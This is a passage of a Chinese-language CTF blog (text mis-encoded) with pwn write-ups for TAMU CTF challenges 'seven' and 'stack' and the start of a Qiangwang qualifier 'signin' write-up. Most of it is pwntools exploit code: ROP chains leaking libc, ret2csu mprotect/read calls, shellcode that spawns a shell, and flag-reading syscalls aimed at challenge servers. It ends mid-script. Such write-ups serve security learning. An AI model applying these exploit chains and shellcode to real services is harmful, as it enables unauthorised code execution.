change(payload))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p.recvlines(2)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload = p64(pop_rdi)</span></span><br><span class="line"><span class="string">payload += p64(sh)</span></span><br><span class="line"><span class="string">payload += p64(sys)</span></span><br><span class="line"><span class="string">p.sendafter(b&quot;characters):\n\n&quot;, change(payload))</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line">payload = p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(end)</span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>)  <span class="comment"># rbp</span></span><br><span class="line">payload += p64(read_got)  <span class="comment"># r12</span></span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># edi</span></span><br><span class="line">payload += p64(bss + <span class="number">0x88</span> + <span class="number">0x90</span>)  <span class="comment"># rsi</span></span><br><span class="line">payload += p64(<span class="number">0x200</span>)  <span class="comment"># rdx</span></span><br><span class="line">payload += p64(start)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvlines(<span class="number">2</span>)</span><br><span class="line">puts_addr = recv(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">sys, sh = search_from_libc(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">ls(text_offset)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = p64(pop_rdi)</span><br><span class="line">payload += p64(sh)</span><br><span class="line">payload += p64(sys)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>æ¥ä¸‹æ¥æ˜¯ä¸¤ä¸ªshellcodeç¼–å†™ï¼Œä¸ªäººè®¤ä¸ºæœ€æœ‰æ„æ€çš„éƒ¨åˆ†</p>
</blockquote>
<h1 id="seven"><a href="#seven" class="headerlink" title="seven"></a>seven</h1><p>æ¡ä»¶æä¸ºè‹›åˆ»ï¼Œåªå…è®¸å†™å…¥7ä¸ªå­—èŠ‚ï¼Œè€Œä¸”shellcodeæ®µåœ¨è·³è½¬å‰å–æ¶ˆäº†å†™æƒé™ã€‚<br>åœ¨è¿™ç§æƒ…å†µä¸‹æ„é€ mprotect + readç»„åˆè¿›ä¸€æ­¥å†™å…¥æ˜¯æ— æ³•åšåˆ°çš„ï¼ˆå³ä½¿å€ŸåŠ©ç°æœ‰å¯„å­˜å™¨ï¼‰ï¼Œæ‹¿shellæ›´æ˜¯ä¸å¯èƒ½ã€‚<br>è½¬æ¢æ€è·¯ï¼Œæˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨æ„é€ ä¸€ä¸ªæ ˆæº¢å‡ºæ¼æ´ï¼Œç„¶åç”¨æ ˆæº¢å‡ºçš„æ€è·¯å»è§£é¢˜ã€‚</p>
<p>åˆ†æå¯„å­˜å™¨æ¡ä»¶ï¼Œå¯ä»¥æ„é€ å¦‚ä¸‹shellcodeä½œä¸ºä¸€ä¸ªå¾ˆé•¿çš„æ ˆæº¢å‡ºæ¼æ´</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov edi, eax</span><br><span class="line">push rsp</span><br><span class="line">pop rsi</span><br><span class="line">syscall</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>retè¿”å›åœ°å€ä¼šç›´æ¥è½åœ¨æˆ‘ä»¬è¾“å…¥çš„ä½ç½®ä¸Šï¼Œæ­£å¥½è¿™ä¸ªé¢˜æœ‰csuï¼Œé€šè¿‡csuå®Œæˆmprotect + read,å¾€shellcodeæ®µè¯»å…¥shellcodeåå†è·³è½¬è¿‡å»å³å¯ã€‚</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./seven/seven&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;61.147.171.105&quot;</span>, <span class="number">29144</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;tamuctf_seven&quot;</span>)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov edi, eax</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">p.send(asm(payload))</span><br><span class="line">mprotect = elf.got[<span class="string">&quot;mprotect&quot;</span>]</span><br><span class="line">read = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line">payload = csu(edi=<span class="number">0x500000</span>, rsi=<span class="number">0x1000</span>, rdx=<span class="number">0x7</span>, r12=mprotect)</span><br><span class="line">payload += csu(edi=<span class="number">0x0</span>, rsi=<span class="number">0x500000</span>, rdx=<span class="number">0x500</span>, r12=read)</span><br><span class="line">payload += p64(<span class="number">0x500000</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment"># 7478742e67616c662f2e0a</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">orw = (</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 0;</span></span><br><span class="line"><span class="string">mov rax, 2;</span></span><br><span class="line"><span class="string">mov rcx, 0x7478742e67616c66</span></span><br><span class="line"><span class="string">push rcx</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor rsi, rsi</span></span><br><span class="line"><span class="string">xor rdx, rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    + sendfile</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2.5</span>)</span><br><span class="line">p.send(asm(orw))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h1><blockquote>
<p>ä¸ªäººè®¤ä¸ºæœ€æœ‰æ„æ€çš„é¢˜ç›®</p>
</blockquote>
<p>ç›´æ¥çœ‹Cæºç ï¼Œå‘ç°é¢˜ç›®åªå…è®¸push&#x2F;popæ“ä½œï¼Œæ“ä½œå¯„å­˜å™¨å¿…é¡»ä»¥â€râ€å¼€å¤´<br>ä¸“é—¨å»çœ‹äº†intelçš„å¼€å‘æ‰‹å†Œï¼Œå‘ç°å…è®¸å†…å®¹å°±æ˜¯åªæœ‰push&#x2F;pop rax~r15(åŒ…æ‹¬rsp)è¿™å‡ ä¸ª</p>
<p>ä¸ªäººè®¤ä¸ºå¦‚æœçœŸä»…ä»…ç”¨è¿™å‡ ä¸ªæ“ä½œç¡®å®æ˜¯æ— æ³•get shellçš„ï¼ˆè¿syscalléƒ½æ— æ³•åšåˆ°ï¼‰ï¼Œè§£å†³æ–¹æ¡ˆåœ¨æ ˆä¸Šã€‚</p>
<p>æ€è·¯æ˜¯æ„é€ read syscallå†æ¬¡è¯»å…¥shellcodeæ¥ç»•è¿‡è¿‡æ»¤ã€‚é€šè¿‡å„ç§æ ˆæ“ä½œæˆ‘ä»¬å¯ä»¥è®¾ç½®åˆé€‚çš„rdi,rsi,rdxå’Œraxå€¼ï¼Œåªå·®syscall<br>è€Œsyscallçš„æ±‡ç¼–ä¸º<code>\x0f\x05</code>ï¼Œäº‹å®ä¸Šæˆ‘ä»¬å¯ä»¥åœ¨æ ˆä¸Šåˆ›é€ ä¸€ä¸ª<code>\x0f\x05</code>ï¼Œå°±æ˜¯å°†è¾“å…¥é•¿åº¦è¡¥é½åˆ°0x50f;<br>åˆ†ææºç å¯ä»¥å‘ç°åœ¨æ ˆä¸Šæœ‰ä¸€ä¸ªå˜é‡æ˜¯å­˜å‚¨è¾“å…¥é•¿åº¦çš„ï¼ˆè°ƒè¯•å‘ç°å°±åœ¨æ ˆé¡¶ï¼‰ï¼Œå¦‚æœè¯¥å€¼ä¸º0x50fï¼Œåœ¨å°ç«¯åºä¸‹ä¾¿æ˜¯<code>\x0f\x05</code>ï¼Œé€šè¿‡æ ˆæ“ä½œæˆ‘ä»¬å¯ä»¥æŠŠå®ƒpushåˆ°shellcodeæ®µä½œä¸ºsyscallä½¿ç”¨ã€‚</p>
<p>ä¹‹åå†ä¼ å…¥æ­£å¸¸çš„shellcodeå³å¯ï¼Œæ³¨æ„è¦æ¢å¤rsp,ä¸ç„¶æ ˆç©ºé—´å¯èƒ½ä¸è¶³</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./stack/stack&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;61.147.171.105&quot;</span>, <span class="number">29144</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;tamuctf_stack&quot;</span>)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push r8 ~ r15: \x41\x50 ~ \x41\x57</span></span><br><span class="line"><span class="string">pop r8 ~ r15: \x41\x58 ~ \x41\x5f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x0000000000000000:  50    push rax</span></span><br><span class="line"><span class="string">0x0000000000000001:  51    push rcx</span></span><br><span class="line"><span class="string">0x0000000000000002:  52    push rdx</span></span><br><span class="line"><span class="string">0x0000000000000003:  53    push rbx</span></span><br><span class="line"><span class="string">0x0000000000000004:  54    push rsp</span></span><br><span class="line"><span class="string">0x0000000000000005:  55    push rbp</span></span><br><span class="line"><span class="string">0x0000000000000006:  56    push rsi</span></span><br><span class="line"><span class="string">0x0000000000000007:  57    push rdi</span></span><br><span class="line"><span class="string">0x0000000000000008:  58    pop  rax</span></span><br><span class="line"><span class="string">0x0000000000000009:  59    pop  rcx</span></span><br><span class="line"><span class="string">0x000000000000000a:  5A    pop  rdx</span></span><br><span class="line"><span class="string">0x000000000000000b:  5B    pop  rbx</span></span><br><span class="line"><span class="string">0x000000000000000c:  5C    pop  rsp</span></span><br><span class="line"><span class="string">0x000000000000000d:  5D    pop  rbp</span></span><br><span class="line"><span class="string">0x000000000000000e:  5E    pop  rsi</span></span><br><span class="line"><span class="string">0x000000000000000f:  5F    pop  rdi</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">pop rbx</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push r10</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push r10</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push rsi</span></span><br><span class="line"><span class="string">pop rsp</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line">payload = asm(shell)</span><br><span class="line">payload = payload.ljust(<span class="number">0x50F</span>, <span class="string">b&quot;\x50&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rsp, rbp</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shellcode += shellcraft.sh()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span> * <span class="number">0x12</span></span><br><span class="line">payload += asm(shellcode)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/20/2024qwntb/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="NazrinDuck">
      <meta itemprop="description" content="FÃ¢tih'in Ä°stanbul'u fethettiÄŸi yaÅŸtasÄ±n!">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Blog de ĞĞ°Ğ·Ñ€Ğ¸Ğ½Ğ´Ğ°Ğº">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/20/2024qwntb/" class="post-title-link" itemprop="url">[ç¬¬ä¸ƒå±Šâ€œå¼ºç½‘â€æ‹Ÿæ€é˜²å¾¡å›½é™…ç²¾è‹±æŒ‘æˆ˜èµ›-çº¿ä¸Šé¢„é€‰èµ›] Pwn writeupï¼ˆéƒ¨åˆ†ï¼‰</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-10-20 18:03:35 / Modified: 18:16:17" itemprop="dateCreated datePublished" datetime="2024-10-20T18:03:35+08:00">2024-10-20</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>å’Œå¼ºç½‘æ¯æ•´æ··äº†ï¼Œè¿˜ä»¥ä¸ºqwbçš„pwnæ€ä¹ˆå˜ç®€å•äº†</p>
</blockquote>
<p>è¿™æ¬¡è™½ç„¶æœ‰ä¸¤ä¸ªèœå•å †ç±»ä¼¼ç‰©ï¼ˆkernelé™¤å¤–ï¼‰ï¼Œä½†æ²¡æœ‰ä¸€ä¸ªå’Œå †åˆ©ç”¨æœ‰å…³ã€‚é£å‘è¦å˜äº†ï¼Ÿ</p>
<hr>
<h1 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h1><blockquote>
<p>ä¸€å¼€å§‹é™„ä»¶ç»™é”™äº†ï¼Œæ¢å®Œé™„ä»¶åå‘ç°å·®è·ä¸å¤§ï¼Œæ‹¿äº†äºŒè¡€</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.dynelf <span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> pwnlib.fmtstr <span class="keyword">import</span> make_atoms_simple</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./signin_t/vuln&quot;</span></span><br><span class="line">libc_path = <span class="string">&quot;./signin_t/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">rop = ROP(binary_path)</span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_dll = cdll.LoadLibrary(libc_path)</span><br><span class="line"></span><br><span class="line">libc_dll.srand(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;61.147.171.105&quot;</span>, <span class="number">29144</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;pwn-5419033d36.challenge.xctf.org.cn&quot;</span>, <span class="number">9999</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># __libc_start_main</span></span><br><span class="line"></span><br><span class="line">csu_start = <span class="number">0x0401870</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">edi=<span class="number">0</span>, rsi=<span class="number">0</span>, rdx=<span class="number">0</span>, r12=<span class="number">0</span>, start=csu_start, mode=<span class="number">0</span></span>):</span><br><span class="line">    end = start + <span class="number">0x1A</span></span><br><span class="line">    payload = p64(end)</span><br><span class="line">    payload += p64(<span class="number">0</span>)  <span class="comment"># rbx</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)  <span class="comment"># rbp</span></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="number">0</span>:</span><br><span class="line">        payload += p64(r12)  <span class="comment"># r12</span></span><br><span class="line">        payload += p64(edi)  <span class="comment"># edi</span></span><br><span class="line">        payload += p64(rsi)  <span class="comment"># rsi</span></span><br><span class="line">        payload += p64(rdx)  <span class="comment"># rdx</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload += p64(edi)  <span class="comment"># r12</span></span><br><span class="line">        payload += p64(rsi)  <span class="comment"># edi</span></span><br><span class="line">        payload += p64(rdx)  <span class="comment"># rsi</span></span><br><span class="line">        payload += p64(r12)  <span class="comment"># rdx</span></span><br><span class="line">    payload += p64(start)</span><br><span class="line">    payload += <span class="string">b&quot;a&quot;</span> * <span class="number">56</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =================start=================#</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">2</span> + <span class="string">b&quot;\x00\x00&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    res = libc_dll.rand() % <span class="number">100</span> + <span class="number">1</span></span><br><span class="line">    p.sendafter(<span class="string">b&quot;code:\n&quot;</span>, p8(res))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="string">b&quot;\x01&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&quot;Index: \n&quot;</span>, <span class="string">b&quot;\x01&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&quot;Note: \n&quot;</span>, <span class="string">b&quot;aaaabbbb&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt.puts</span><br><span class="line">puts_got = elf.got.puts</span><br><span class="line">vuln_addr = elf.sym.o_O</span><br><span class="line">read_addr = <span class="number">0x4013CF</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401893</span></span><br><span class="line">lev_ret = <span class="number">0x00000000004013BE</span></span><br><span class="line">ret_addr = <span class="number">0x000000000040101A</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x108</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(vuln_addr)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">libc_base = recv(<span class="string">b&quot;\n&quot;</span>) - libc.sym.puts</span><br><span class="line">mprotect_addr = libc_base + libc.sym.mprotect</span><br><span 